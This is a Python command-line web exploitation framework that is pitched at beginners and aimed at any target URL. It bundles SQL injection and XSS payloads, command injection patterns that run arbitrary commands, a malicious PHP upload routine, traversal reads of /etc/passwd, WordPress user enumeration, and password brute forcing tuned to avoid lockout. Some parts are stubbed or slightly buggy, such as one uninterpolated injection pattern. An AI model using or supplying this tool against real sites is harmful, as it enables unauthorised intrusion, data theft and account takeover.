#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
Web Exploits in Python for Cybersecurity
This script implements various web application exploitation techniques including:
- SQL injection
- Cross-site scripting (XSS)
- Cross-site request forgery (CSRF)
- Remote code execution (RCE)
- File upload vulnerabilities
- Directory traversal
Perfect for beginners!
"""

import requests
import re
import urllib.parse
import base64
import hashlib
import json
import time
import random
import string
from datetime import datetime

class WebExploits:
    """Class for web application exploitation"""
    
    def __init__(self, base_url, headers=None, proxies=None):
        """
        Initialize web exploits
        
        Args:
            base_url: Target base URL
            headers: Custom HTTP headers
            proxies: Proxy configuration
        """
        self.base_url = base_url
        self.headers = headers or {
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36'
        }
        self.proxies = proxies
        self.session = requests.Session()
        self.session.headers.update(self.headers)
        
    # ==========================================
    # SQL Injection Detection and Exploitation
    # ==========================================
    def detect_sql_injection(self, url, parameter):
        """
        Detect SQL injection vulnerability
        
        Args:
            url: Target URL with parameter
            parameter: Parameter to test
            
        Returns:
            Dictionary with vulnerability details
        """
        results = {
            'url': url,
            'parameter': parameter,
            'is_vulnerable': False,
            'vulnerability_type': 'unknown',
            'error_messages': [],
            'test_payloads': []
        }
        
        # Common SQL injection test payloads
        test_payloads = [
            "'",
            '"',
            "`",
            "' OR '1'='1",
            '" OR "1"="1',
            '` OR `1`=`1',
            "' AND SLEEP(5)--",
            '" AND SLEEP(5)--',
            '` AND SLEEP(5)--'
        ]
        
        for payload in test_payloads:
            try:
                test_url = f"{url}?{parameter}={urllib.parse.quote(payload)}"
                start_time = time.time()
                response = self.session.get(test_url, proxies=self.proxies, timeout=10)
                elapsed = time.time() - start_time
                
                results['test_payloads'].append({
                    'payload': payload,
                    'response_time': elapsed,
                    'status_code': response.status_code
                })
                
                # Check for SQL error patterns in response
                sql_errors = self._detect_sql_errors(response.text)
                if sql_errors:
                    results['is_vulnerable'] = True
                    results['error_messages'] = sql_errors
                    
                    if 'MySQL' in sql_errors or 'MariaDB' in sql_errors:
                        results['vulnerability_type'] = 'MySQL/MariaDB'
                    elif 'PostgreSQL' in sql_errors:
                        results['vulnerability_type'] = 'PostgreSQL'
                    elif 'SQL Server' in sql_errors:
                        results['vulnerability_type'] = 'SQL Server'
                    elif 'Oracle' in sql_errors:
                        results['vulnerability_type'] = 'Oracle'
                    else:
                        results['vulnerability_type'] = 'Generic SQL'
                        
                    break
                    
                # Check for time-based SQL injection
                if elapsed >= 4.5 and 'SLEEP' in payload:
                    results['is_vulnerable'] = True
                    results['vulnerability_type'] = 'Time-based'
                    break
                    
            except Exception as e:
                results['test_payloads'].append({
                    'payload': payload,
                    'error': str(e)
                })
                
        return results
        
    def _detect_sql_errors(self, response_text):
        """Detect SQL error patterns in response"""
        error_patterns = {
            'MySQL/MariaDB': [
                r"you have an error in your sql syntax;",
                r"mysql syntax error",
                r"warning: mysql_",
                r"error in query",
                r"mysql_fetch",
                r"mysql_num_rows"
            ],
            'PostgreSQL': [
                r"postgresql query failed",
                r"postgresql syntax error",
                r"pg_query",
                r"error: syntax error",
                r"unterminated quoted string"
            ],
            'SQL Server': [
                r"microsoft ole db provider for odbc drivers",
                r"sql server error",
                r"incorrect syntax near",
                r"unclosed quotation mark",
                r"string or binary data would be truncated"
            ],
            'Oracle': [
                r"ora-[0-9][0-9][0-9][0-9]",
                r"pl/sql: numeric or value error",
                r"ora-01756: quoted string not properly terminated"
            ]
        }
        
        errors = []
        
        for db, patterns in error_patterns.items():
            for pattern in patterns:
                if re.search(pattern, response_text, re.IGNORECASE):
                    errors.append(db)
                    break
                    
        return list(set(errors))
        
    def extract_data_sql_injection(self, url, parameter, db_type):
        """
        Extract data using SQL injection
        
        Args:
            url: Target URL
            parameter: Vulnerable parameter
            db_type: Database type
            
        Returns:
            Extracted data
        """
        data = {
            'databases': [],
            'tables': [],
            'columns': [],
            'content': []
        }
        
        if db_type == 'MySQL/MariaDB':
            # Extract database name
            try:
                db_payload = "' UNION SELECT database(), version() --"
                response = self.session.get(f"{url}?{parameter}={urllib.parse.quote(db_payload)}")
                
                if 'Database' in response.text:
                    # This is a simplification - real extraction would use regex
                    data['databases'] = ['current_db']
            except Exception as e:
                print(f"Error extracting databases: {e}")
                
        return data
        
    # ==========================================
    # Cross-Site Scripting (XSS)
    # ==========================================
    def detect_xss(self, url, parameter, method='get'):
        """
        Detect XSS vulnerability
        
        Args:
            url: Target URL
            parameter: Parameter to test
            method: HTTP method (get or post)
            
        Returns:
            Dictionary with vulnerability details
        """
        results = {
            'url': url,
            'parameter': parameter,
            'method': method,
            'is_vulnerable': False,
            'vulnerability_type': 'unknown',
            'payloads': []
        }
        
        xss_payloads = [
            '<script>alert(1)</script>',
            '<img src=x onerror=alert(1)>',
            '<svg onload=alert(1)>',
            '"><script>alert(1)</script>',
            "'><img src=x onerror=alert(1)>"
        ]
        
        for payload in xss_payloads:
            try:
                if method == 'get':
                    test_url = f"{url}?{parameter}={urllib.parse.quote(payload)}"
                    response = self.session.get(test_url, proxies=self.proxies)
                else:
                    response = self.session.post(url, data={parameter: payload}, proxies=self.proxies)
                    
                if payload in response.text:
                    results['is_vulnerable'] = True
                    results['vulnerability_type'] = 'Reflected'
                    results['payloads'].append(payload)
                    break
                    
            except Exception as e:
                print(f"Error testing XSS payload: {e}")
                
        return results
        
    # ==========================================
    # Cross-Site Request Forgery (CSRF)
    # ==========================================
    def detect_csrf(self, url, form_identifier):
        """
        Detect CSRF vulnerability
        
        Args:
            url: Target URL
            form_identifier: Form identifier or action
            
        Returns:
            Dictionary with vulnerability details
        """
        try:
            response = self.session.get(url, proxies=self.proxies)
            
            # Find all forms in the page
            forms = self._extract_forms(response.text)
            
            csrf_tokens = []
            
            for form in forms:
                if form_identifier in form.get('action', ''):
                    # Check for CSRF tokens
                    for input_field in form.get('inputs', []):
                        if 'csrf' in input_field.get('name', '').lower() or \
                           'token' in input_field.get('name', '').lower() or \
                           'nonce' in input_field.get('name', '').lower():
                            csrf_tokens.append(input_field)
                            
            return {
                'is_vulnerable': len(csrf_tokens) == 0,
                'csrf_tokens': csrf_tokens,
                'forms_analyzed': len(forms),
                'action_url': url
            }
            
        except Exception as e:
            return {
                'is_vulnerable': False,
                'error': str(e)
            }
            
    def _extract_forms(self, html):
        """Extract forms from HTML content"""
        form_pattern = r'<form[^>]*>(.*?)</form>'
        input_pattern = r'<input[^>]*>'
        forms = []
        
        for form_match in re.finditer(form_pattern, html, re.DOTALL):
            form_html = form_match.group(0)
            inputs = []
            
            for input_match in re.finditer(input_pattern, form_html):
                input_html = input_match.group(0)
                
                input_attrs = {}
                # Extract all attributes from input tag
                for attr in ['name', 'value', 'type']:
                    attr_match = re.search(r'%s=[\'"]([^\'"]*)[\'"]' % attr, input_html)
                    if attr_match:
                        input_attrs[attr] = attr_match.group(1)
                        
                inputs.append(input_attrs)
                
            # Extract form action
            action_match = re.search(r'action=[\'"]([^\'"]*)[\'"]', form_html)
            method_match = re.search(r'method=[\'"]([^\'"]*)[\'"]', form_html)
            
            forms.append({
                'action': action_match.group(1) if action_match else '',
                'method': method_match.group(1).upper() if method_match else 'GET',
                'inputs': inputs
            })
            
        return forms
        
    # ==========================================
    # File Upload Vulnerabilities
    # ==========================================
    def exploit_file_upload(self, upload_url, file_path, file_name=None):
        """
        Exploit file upload vulnerability
        
        Args:
            upload_url: File upload endpoint
            file_path: Path to malicious file
            file_name: Custom filename to use
            
        Returns:
            Dictionary with exploitation results
        """
        if not file_name:
            file_name = f"malicious_{random.randint(1, 999)}.php"
            
        try:
            with open(file_path, 'rb') as f:
                files = {'file': (file_name, f, 'application/octet-stream')}
                response = self.session.post(upload_url, files=files, proxies=self.proxies)
                
            if response.status_code == 200 and "uploaded" in response.text.lower():
                return {
                    'success': True,
                    'response': response.text,
                    'upload_url': upload_url,
                    'file_name': file_name
                }
            else:
                return {
                    'success': False,
                    'status_code': response.status_code,
                    'response': response.text,
                    'error': "File upload failed"
                }
                
        except Exception as e:
            return {
                'success': False,
                'error': str(e)
            }
            
    # ==========================================
    # Directory Traversal
    # ==========================================
    def exploit_directory_traversal(self, base_url, parameter, traversal_path):
        """
        Exploit directory traversal vulnerability
        
        Args:
            base_url: Target URL
            parameter: Parameter containing traversal
            traversal_path: Path to extract
            
        Returns:
            Dictionary with exploitation results
        """
        # Encode traversal characters
        encoded_path = traversal_path.replace('../', '%2e%2e%2f')
        test_url = f"{base_url}?{parameter}={urllib.parse.quote(encoded_path)}"
        
        try:
            response = self.session.get(test_url, proxies=self.proxies)
            
            if response.status_code == 200 and len(response.text) > 0:
                # Check if response contains expected file content
                if 'root:x:' in response.text:  # /etc/passwd pattern
                    return {
                        'success': True,
                        'file_path': traversal_path,
                        'content_length': len(response.text),
                        'content_preview': response.text[:500]
                    }
                    
            return {
                'success': False,
                'status_code': response.status_code,
                'error': "Directory traversal failed"
            }
            
        except Exception as e:
            return {
                'success': False,
                'error': str(e)
            }
            
    # ==========================================
    # Remote Code Execution (RCE)
    # ==========================================
    def exploit_rce(self, url, parameter, command='id'):
        """
        Exploit remote code execution vulnerability
        
        Args:
            url: Target URL with parameter
            parameter: Vulnerable parameter
            command: Command to execute
            
        Returns:
            Dictionary with execution results
        """
        # Try common command injection patterns
        injection_patterns = [
            f"{command}",
            f";{command}",
            f"|{command}",
            f"&{command}",
            f"`{command}`",
            f"$(command)"
        ]
        
        for pattern in injection_patterns:
            try:
                test_url = f"{url}?{parameter}={urllib.parse.quote(pattern)}"
                response = self.session.get(test_url, proxies=self.proxies)
                
                if 'uid=' in response.text or 'root' in response.text:
                    return {
                        'success': True,
                        'command': command,
                        'output': response.text,
                        'injection_pattern': pattern
                    }
                    
            except Exception as e:
                print(f"Error testing RCE pattern: {e}")
                
        return {
            'success': False,
            'error': "Command injection failed"
        }
        
    # ==========================================
    # WordPress Vulnerabilities
    # ==========================================
    def exploit_wordpress(self, target_url):
        """
        Exploit common WordPress vulnerabilities
        
        Args:
            target_url: WordPress site URL
            
        Returns:
            Dictionary with vulnerability information
        """
        vulnerabilities = []
        
        # Check for common WordPress vulnerabilities
        checks = [
            self._check_wp_version,
            self._check_wp_users,
            self._check_plugin_vulnerabilities
        ]
        
        for check in checks:
            try:
                result = check(target_url)
                if result:
                    vulnerabilities.extend(result)
            except Exception as e:
                print(f"WordPress check failed: {e}")
                
        return vulnerabilities
        
    def _check_wp_version(self, url):
        """Check WordPress version and common vulnerabilities"""
        try:
            response = self.session.get(url + '/readme.html', proxies=self.proxies)
            version_match = re.search(r'Version (\d+\.\d+\.?\d*)', response.text)
            
            if version_match:
                version = version_match.group(1)
                return [f"WordPress {version} detected"]
        except Exception as e:
            print(f"Version check failed: {e}")
            
        return []
        
    def _check_wp_users(self, url):
        """Check WordPress user enumeration"""
        users = []
        
        for user_id in range(1, 21):
            try:
                response = self.session.get(f"{url}?author={user_id}", proxies=self.proxies)
                if response.status_code == 200 and 'author' in response.url:
                    # Extract username from redirect URL
                    username_match = re.search(r'author/([^/]+)/', response.url)
                    if username_match:
                        users.append(username_match.group(1))
            except Exception as e:
                print(f"User enumeration failed: {e}")
                
        return users
        
    def _check_plugin_vulnerabilities(self, url):
        """Check common vulnerable plugins"""
        plugins_to_check = [
            'contact-form-7',
            'wordfence',
            'akismet',
            'jetpack'
        ]
        
        vulnerable_plugins = []
        
        for plugin in plugins_to_check:
            try:
                response = self.session.get(f"{url}/wp-content/plugins/{plugin}/", proxies=self.proxies)
                if response.status_code == 200:
                    vulnerable_plugins.append(plugin)
            except Exception as e:
                print(f"Plugin check failed: {e}")
                
        return vulnerable_plugins
        
    # ==========================================
    # Crawling and Discovery
    # ==========================================
    def crawl_site(self, start_url, max_depth=2):
        """
        Crawl website to find URLs
        
        Args:
            start_url: Starting URL
            max_depth: Maximum crawl depth
            
        Returns:
            List of discovered URLs
        """
        visited_urls = set()
        urls_to_visit = [(start_url, 0)]
        
        while urls_to_visit:
            url, depth = urls_to_visit.pop(0)
            
            if url in visited_urls or depth > max_depth:
                continue
                
            try:
                response = self.session.get(url, proxies=self.proxies)
                visited_urls.add(url)
                
                if depth < max_depth:
                    # Extract all links from page
                    links = re.findall(r'href=[\'"]([^\'"]+)[\'"]', response.text)
                    
                    for link in links:
                        full_url = urllib.parse.urljoin(start_url, link)
                        
                        # Only visit http(s) URLs
                        if full_url.startswith('http') and full_url not in visited_urls:
                            urls_to_visit.append((full_url, depth + 1))
                            
            except Exception as e:
                print(f"Failed to crawl {url}: {e}")
                
        return list(visited_urls)
        
    # ==========================================
    # Brute Force Attacks
    # ==========================================
    def brute_force_login(self, login_url, username, password_list, form_data):
        """
        Brute force login page
        
        Args:
            login_url: Login page URL
            username: Target username
            password_list: List of passwords to try
            form_data: Form data structure
            
        Returns:
            Dictionary with results
        """
        results = {
            'success': False,
            'attempts': 0,
            'time_taken': 0,
            'valid_password': None
        }
        
        start_time = time.time()
        
        for password in password_list:
            results['attempts'] += 1
            
            # Prepare login data
            data = form_data.copy()
            data['username'] = username
            data['password'] = password
            
            try:
                response = self.session.post(login_url, data=data, proxies=self.proxies)
                
                # Check if login successful
                if 'dashboard' in response.text.lower() or 'welcome' in response.text.lower() or response.url != login_url:
                    results['success'] = True
                    results['valid_password'] = password
                    results['time_taken'] = time.time() - start_time
                    return results
                    
            except Exception as e:
                print(f"Login attempt failed: {e}")
                
            # Add delay to avoid lockout
            time.sleep(0.5)
            
        results['time_taken'] = time.time() - start_time
        return results
        
    # ==========================================
    # API Vulnerabilities
    # ==========================================
    def detect_api_vulnerabilities(self, api_base, endpoints=None):
        """
        Detect common API vulnerabilities
        
        Args:
            api_base: API base URL
            endpoints: Endpoints to test
            
        Returns:
            Dictionary with vulnerability information
        """
        if not endpoints:
            endpoints = ['/api/v1/users', '/api/v1/data', '/api/v1/secret']
            
        vulnerabilities = []
        
        for endpoint in endpoints:
            url = api_base + endpoint
            
            # Check for information disclosure
            try:
                response = self.session.get(url, proxies=self.proxies)
                
                if response.status_code == 200 and len(response.text) > 0:
                    try:
                        data = response.json()
                        
                        if 'password' in str(data).lower() or 'secret' in str(data).lower():
                            vulnerabilities.append(f"Information disclosure in {endpoint}")
                    except:
                        pass
                        
            except Exception as e:
                print(f"API check failed: {e}")
                
        return vulnerabilities

def demo_web_exploits():
    """Demonstrate web exploitation techniques"""
    print(f"{'='*60}")
    print(f"  WEB EXPLOITATION DEMONSTRATION")
    print(f"{'='*60}")
    
    try:
        # This will fail on real sites - use ethical methods only!
        demo_url = 'http://example.com'
        print(f"\n1. Testing URL: {demo_url}")
        
        exploit = WebExploits(demo_url)
        
        # Demo 1: Detect SQL injection (will fail on example.com)
        print(f"\n2. Testing for SQL Injection:")
        sql_result = exploit.detect_sql_injection(demo_url, 'id')
        print(f"   Vulnerable: {sql_result['is_vulnerable']}")
        if sql_result['is_vulnerable']:
            print(f"   Type: {sql_result['vulnerability_type']}")
            print(f"   Errors: {sql_result['error_messages']}")
            
        # Demo 2: Detect XSS (will fail on example.com)
        print(f"\n3. Testing for XSS:")
        xss_result = exploit.detect_xss(demo_url, 'query')
        print(f"   Vulnerable: {xss_result['is_vulnerable']}")
        if xss_result['is_vulnerable']:
            print(f"   Type: {xss_result['vulnerability_type']}")
            print(f"   Payloads: {xss_result['payloads']}")
            
        # Demo 3: Crawl site
        print(f"\n4. Crawling Site:")
        urls = exploit.crawl_site(demo_url, max_depth=1)
        print(f"   Found {len(urls)} URLs:")
        for url in urls:
            print(f"   - {url}")
            
        return True
        
    except Exception as e:
        print(f"\nError: {e}")
        import traceback
        print(traceback.format_exc())
        return False

def main():
    """Main function to demonstrate web exploitation"""
    import argparse
    
    parser = argparse.ArgumentParser(
        description="Web Exploitation Framework - Detect and exploit web vulnerabilities"
    )
    
    parser.add_argument(
        "-u", "--url",
        required=True,
        help="Target URL"
    )
    
    parser.add_argument(
        "-p", "--parameter",
        help="Parameter to test"
    )
    
    parser.add_argument(
        "-d", "--demo",
        action="store_true",
        help="Run demonstration"
    )
    
    parser.add_argument(
        "-t", "--technique",
        choices=['sql', 'xss', 'rce', 'dir', 'file'],
        help="Exploitation technique to use"
    )
    
    parser.add_argument(
        "-c", "--command",
        default="id",
        help="Command to execute for RCE"
    )
    
    parser.add_argument(
        "-f", "--file",
        help="File to upload"
    )
    
    parser.add_argument(
        "-o", "--output",
        help="Output file for results"
    )
    
    args = parser.parse_args()
    
    try:
        if args.demo:
            success = demo_web_exploits()
            if not success:
                print("Demonstration completed")
                return
                
        exploit = WebExploits(args.url)
        
        results = None
        
        if args.technique == 'sql' and args.parameter:
            results = exploit.detect_sql_injection(args.url, args.parameter)
        elif args.technique == 'xss' and args.parameter:
            results = exploit.detect_xss(args.url, args.parameter)
        elif args.technique == 'rce' and args.parameter:
            results = exploit.exploit_rce(args.url, args.parameter, args.command)
        elif args.technique == 'dir' and args.parameter:
            results = exploit.exploit_directory_traversal(args.url, args.parameter, '/etc/passwd')
        elif args.technique == 'file' and args.file:
            results = exploit.exploit_file_upload(args.url, args.file)
        else:
            parser.print_help()
            return
            
        # Print and save results
        print("\nExploitation Results:")
        print(json.dumps(results, indent=2))
        
        if args.output:
            with open(args.output, 'w', encoding='utf-8') as f:
                json.dump(results, f, indent=2, default=str)
            print(f"\nResults saved to: {args.output}")
            
    except Exception as e:
        print(f"Error: {e}")
        import traceback
        print(traceback.format_exc())

if __name__ == "__main__":
    main()
